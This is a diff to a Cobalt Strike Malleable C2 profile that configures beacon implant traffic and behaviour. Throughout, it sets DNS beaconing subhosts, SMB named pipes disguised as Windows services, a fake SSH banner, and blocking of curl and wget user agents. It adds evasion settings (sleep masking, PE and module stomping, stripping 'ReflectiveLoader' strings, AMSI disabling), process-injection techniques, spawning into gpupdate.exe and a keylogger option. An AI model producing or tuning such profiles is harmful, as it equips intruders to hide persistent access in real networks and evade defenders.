@@ -5,8 +5,41 @@
 set sleeptime "30000";
 set jitter    "20";
 set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)";
-set dns_idle "8.8.8.8";
-set maxdns    "235";
+
+set data_jitter "50";
+
+dns-beacon {
+    # Options moved into 'dns-beacon' group in 4.3:
+    set dns_idle             "8.8.8.8";
+    set dns_max_txt          "220";
+    set dns_sleep            "0";
+    set dns_ttl              "1";
+    set maxdns               "255";
+    set dns_stager_prepend   ".wwwds.";
+    set dns_stager_subhost   ".e2867.dsca.";
+     
+    # DNS subhost override options added in 4.3:
+    set beacon               "d-bx.";
+    set get_A                "d-1ax.";
+    set get_AAAA             "d-4ax.";
+    set get_TXT              "d-1tx.";
+    set put_metadata         "d-1mx";
+    set put_output           "d-1ox.";
+    set ns_response          "zero";
+}
+
+###SMB options###
+set pipename "ntsvcs##";
+set pipename_stager "scerpc##";
+set smb_frame_header "";
+
+###TCP options###
+set tcp_port "8000";
+set tcp_frame_header "";
+
+###SSH options###
+set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
+set ssh_pipename "SearchTextHarvester##";
 
 #custom cert
 #https-certificate {
@@ -16,13 +49,16 @@ set maxdns    "235";
 
 http-config {
 #    set headers "Server, Content-Type, Cache-Control, Connection";
-#    header "Content-Type" "text/html;charset=UTF-8";
 #    header "Connection" "close";
 #    header "Cache-Control" "max-age=2";
 #    header "Server" "nginx";
     #set "true" if teamserver is behind redirector
     set trust_x_forwarded_for "false";
+    
+    set block_useragents "curl*,lynx*,wget*";
 }
+
+#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";
 
 http-get {
 
@@ -151,58 +187,52 @@ http-stager {
 
 }
 
-###Malleable PE Options###
-
-post-ex {
-
-    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
-    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
-
-    set obfuscate "true";
-
-    set smartinject "true";
-
-    set amsi_disable "true";
-
-}
-
-#use peclone on the dll you want to use, this example uses wwanmm.dll. You can also set the values manually.
-#don't use 'set image_size_xx' if using 'set module_xx'. During testing it seemed to double the size of my payload causing module stomp to fail, need to test it out more though.
+###Malleable PE/Stage Block###
 stage {
-    set checksum       "0";
-    set compile_time   "25 Oct 2016 01:57:23";
-    set entry_point    "170000";
+    set checksum        "0";
+    set compile_time    "17 Oct 2020 04:32:14";
+    set entry_point     "170001";
     #set image_size_x86 "6586368";
     #set image_size_x64 "6586368";
-    #set name	   "WWanMM.dll";
-    set userwx 	   "false";
-    set cleanup	   "true";
-    set sleep_mask	   "true";
-    set stomppe	   "true";
-    set obfuscate	   "true";
-    set rich_header    "\xee\x50\x19\xcf\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xa3\x49\xe4\x9c\x84\x31\x77\x9c\x1e\xad\x86\x9c\xae\x31\x77\x9c\x1e\xad\x85\x9c\xa7\x31\x77\x9c\xaa\x31\x76\x9c\x08\x31\x77\x9c\x1e\xad\x98\x9c\xa3\x31\x77\x9c\x1e\xad\x84\x9c\x98\x31\x77\x9c\x1e\xad\x99\x9c\xab\x31\x77\x9c\x1e\xad\x80\x9c\x6d\x31\x77\x9c\x1e\xad\x9a\x9c\xab\x31\x77\x9c\x1e\xad\x87\x9c\xab\x31\x77\x9c\x52\x69\x63\x68\xaa\x31\x77\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+    #set name	        "WWanMM.dll";
+    set userwx 	        "false";
+    set cleanup	        "true";
+    set sleep_mask	"true";
+    set stomppe	        "true";
+    set obfuscate	"true";
+    set rich_header     "";
     
-    #obfuscate beacon before sleep.
     set sleep_mask "true";
-
-#module stomp. Make sure the dll you use is bigger than your payload and test it with post exploit options to make sure everything is working.
+    
+    set smartinject "true";
+    
+    #allocator options include HeapAlloc, MapViewOfFile, VirtualAlloc, or you can use module stomp.
+    #set allocator "HeapAlloc";
+    set magic_mz_x86 "MZRE";
+    set magic_mz_x64 "MZAR";
+    set magic_pe "EA";
 
     set module_x86 "wwanmm.dll";
     set module_x64 "wwanmm.dll";
 
     transform-x86 {
-        prepend "\x90\x90\x90";
+        #prepend "\x90\x90\x90";
         strrep "ReflectiveLoader" "";
         strrep "beacon.dll" "";
         }
 
     transform-x64 {
-        prepend "\x90\x90\x90";
+        #prepend "\x90\x90\x90";
         strrep "ReflectiveLoader" "";
         strrep "beacon.x64.dll" "";
         }
+
+    #string "something";
+    #data "something";
+    #stringw "something"; 
 }
 
+###Process Inject Block###
 process-inject {
 
     set allocator "NtMapViewOfSection";		
@@ -214,17 +244,45 @@ process-inject {
     set startrwx "true";
         
     transform-x86 {
-        prepend "\x90\x90\x90";
+        #prepend "\x90\x90\x90";
     }
     transform-x64 {
-        prepend "\x90\x90\x90";
+        #prepend "\x90\x90\x90";
     }
 
     execute {
-        CreateThread "ntdll!RtlUserThreadStart";
-        CreateThread;
-        NtQueueApcThread;
-        CreateRemoteThread;
+        #CreateThread;
+        #CreateRemoteThread;       
+
+        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";
+
+        SetThreadContext;
+
+        NtQueueApcThread-s;
+
+        #NtQueueApcThread;
+
+        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
+
         RtlCreateUserThread;
     }
-}    
+}
+
+###Post-Ex Block###
+post-ex {
+
+    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
+    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
+
+    set obfuscate "true";
+
+    set smartinject "true";
+
+    set amsi_disable "true";
+    
+    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
+    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
+    set keylogger "SetWindowsHookEx";
+
+
+}
